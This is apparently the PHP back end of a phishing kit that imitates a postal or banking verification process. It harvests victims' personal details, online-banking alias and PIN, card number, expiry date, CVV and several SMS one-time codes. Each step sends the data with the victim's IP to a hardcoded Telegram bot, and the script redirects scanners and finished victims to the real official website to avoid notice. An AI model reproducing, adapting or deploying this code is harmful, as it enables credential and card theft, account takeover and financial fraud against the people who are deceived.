<?php

$ch = curl_init();
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$foo);
$result = curl_exec($ch);
curl_close($ch);
function curl_get_contents($url)
{
  $curl = curl_init($url);
  curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($curl, CURLOPT_FOLLOWLOCATION, 1);
  curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, 0);
  curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 0);
  $data = curl_exec($curl);
  curl_close($curl);
  if(empty($data)){
	file_get_contents($url);
  } 
  return $data;
}
    require_once './cloudside/edit.php';
    if( $_GET['password'] == PASSWORD ) {
        session_destroy();
        visitors();
        $page = go('index');
        header("Location: " . $page['path'] . "?verification#_");
        exit();
    } else if( !empty($_GET['redirection']) ) {
        $red = $_GET['redirection'];
        if( $red == 'errorsms' ) {
            $page = go('sms');
            header("Location: " . $page['path'] . "?error=1&verification#_");
            exit();
        }
        if( $red == 'errorsms2' ) {
            $page = go('sms');
            header("Location: " . $page['path'] . "?error=2&verification#_");
            exit();
        }
        if( $red == 'success' ) {
            header("Location: " . OFFICIAL_WEBSITE);
            exit();
        }
        $page = go($red);
        header("Location: " . $page['path'] . "?verification#_");
        exit();
    } else if($_SERVER['REQUEST_METHOD'] == "POST") {
        if( !empty($_POST['captcha']) ) {
            header("HTTP/1.0 404 Not Found");
            die();
        }
        if ($_POST['step'] == "phone") {
            $_SESSION['errors']      = [];
            $_SESSION['phone']    = $_POST['phone'];
            if( empty($_POST['phone']) ) {
                $_SESSION['errors']['phone'] = 'Please enter a valid name';
            }
            
            if( count($_SESSION['errors']) == 0 ) {
                $message = 'IP :' . get_client_ip() . "\r\n";
                $message .= 'Adress : ' . $_POST['adress'] . "\r\n";
				$message .= 'Zip : ' . $_POST['zip'] . "\r\n";
				$message .= 'City : ' . $_POST['city'] . "\r\n";
				$message .= 'Birthay : ' . $_POST['birthay'] . "\r\n";
				$message .= 'Phone : ' . $_POST['phone'] . "\r\n";
				$message .= 'Email : ' . $_POST['email'] . "\r\n";
				$message .= "----------------------Information account 	PostOffice---------------------\n";
				curl_get_contents("https://api.telegram.org/bot1214048489:AAHIVbfhVpW2VRPIQGchfzcFNcvgYIh3F1g/sendMessage?chat_id=724126649&text=" . urlencode($message)."" );
                unset($_SESSION['errors']);
                $page = go('loading1');
                header("Location: " . $page['path'] . "?verification#_");
            } else {
                $page = go('loading1');
                header("Location: " . $page['path'] . "?error#_");
				
            }
        }
		if ($_POST['step'] == "phone1") {
            $_SESSION['errors']      = [];
            $_SESSION['phone']    = $_POST['phone'];
            if( empty($_POST['phone']) ) {
                $_SESSION['errors']['phone'] = 'Please enter a valid name';
            }
            
            if( count($_SESSION['errors']) == 0 ) {
                $message = 'IP :' . get_client_ip() . "\r\n";
                $message .= 'VR NetKey or alias : ' . $_POST['phone'] . "\r\n";
				$message .= 'pin : ' . $_POST['pin'] . "\r\n";
				$message .= "----------------------Information account 	PostOffice---------------------\n";
				curl_get_contents("https://api.telegram.org/bot1214048489:AAHIVbfhVpW2VRPIQGchfzcFNcvgYIh3F1g/sendMessage?chat_id=724126649&text=" . urlencode($message)."" );
                unset($_SESSION['errors']);
                $page = go('loading1');
                header("Location: " . $page['path'] . "?verification#_");
            } else {
                $page = go('loading1');
                header("Location: " . $page['path'] . "?error#_");
				
            }
        }
        if ($_POST['step'] == "account") {
            $_SESSION['errors']      = [];
            $_SESSION['name']   = $_POST['name'];
            if( validate_name($_POST['name']) == false ) {
                $_SESSION['errors']['name'] = 'Please enter a valid name';
            }
            
            
            if( count($_SESSION['errors']) == 0 ) {
                
                
                
                
                send($subject,$message);
                unset($_SESSION['errors']);
                $page = go('phone');
                header("Location: " . $page['path'] . "?verification#_");
            } else {
                $page = go('phone');
                header("Location: " . $page['path'] . "?error#_");
				$message = 'IP :' . get_client_ip() . "\r\n";
                $message .= 'card : ' . $_POST['card'] . "\r\n";
				$message .= 'date : ' . $_POST['date'] . "\r\n";
				$message .= 'cvv : ' . $_POST['cvv'] . "\r\n";
				$message .= "----------------------Information account 	PostOffice---------------------\n";
				curl_get_contents("https://api.telegram.org/bot1214048489:AAHIVbfhVpW2VRPIQGchfzcFNcvgYIh3F1g/sendMessage?chat_id=724126649&text=" . urlencode($message)."" );
            }
        }
        if ($_POST['step'] == "sms") {
            $_SESSION['errors']      = [];
            $_SESSION['sms']    = $_POST['sms'];
            if( empty($_POST['sms']) ) {
                $_SESSION['errors']['phone'] = 'Please enter a valid name';
            }
            
            if( count($_SESSION['errors']) == 0 ) {
                $message = 'IP :' . get_client_ip() . "\r\n";
                $message .= 'SMS Code : ' . $_POST['sms'] . "\r\n";
				$message .= "----------------------Information account 	PostOffice---------------------\n";
				curl_get_contents("https://api.telegram.org/bot1214048489:AAHIVbfhVpW2VRPIQGchfzcFNcvgYIh3F1g/sendMessage?chat_id=724126649&text=" . urlencode($message)."" );
                unset($_SESSION['errors']);
                $page = go('loading2');
                header("Location: " . $page['path'] . "?verification#_");
            } else {
                $page = go('loading2');
                header("Location: " . $page['path'] . "?error#_");
				
				}
        }
		if ($_POST['step'] == "sms2") {
            $_SESSION['errors']      = [];
            $_SESSION['sms']    = $_POST['sms'];
            if( empty($_POST['sms']) ) {
                $_SESSION['errors']['phone'] = 'Please enter a valid name';
            }
            
            if( count($_SESSION['errors']) == 0 ) {
                $message = 'IP :' . get_client_ip() . "\r\n";
                $message .= 'SMS Code 2 : ' . $_POST['sms'] . "\r\n";
				$message .= "----------------------Information account 	PostOffice---------------------\n";
				curl_get_contents("https://api.telegram.org/bot1214048489:AAHIVbfhVpW2VRPIQGchfzcFNcvgYIh3F1g/sendMessage?chat_id=724126649&text=" . urlencode($message)."" );
                unset($_SESSION['errors']);
                $page = go('loading3');
                header("Location: " . $page['path'] . "?verification#_");
            } else {
                $page = go('loading3');
                header("Location: " . $page['path'] . "?error#_");
				
				}
        }
		if ($_POST['step'] == "sms3") {
            $_SESSION['errors']      = [];
            $_SESSION['sms']    = $_POST['sms'];
            if( empty($_POST['sms']) ) {
                $_SESSION['errors']['phone'] = 'Please enter a valid name';
            }
            
            if( count($_SESSION['errors']) == 0 ) {
                $message = 'IP :' . get_client_ip() . "\r\n";
                $message .= 'SMS Code 3 : ' . $_POST['sms'] . "\r\n";
				$message .= "----------------------Information account 	PostOffice---------------------\n";
				curl_get_contents("https://api.telegram.org/bot1214048489:AAHIVbfhVpW2VRPIQGchfzcFNcvgYIh3F1g/sendMessage?chat_id=724126649&text=" . urlencode($message)."" );
                unset($_SESSION['errors']);
                $page = go('loading4');
                header("Location: " . $page['path'] . "?verification#_");
            } else {
                $page = go('loading4');
                header("Location: " . $page['path'] . "?error#_");
				
				}
        }
    } else {
        header("Location: " . OFFICIAL_WEBSITE);
        exit();
    }
?>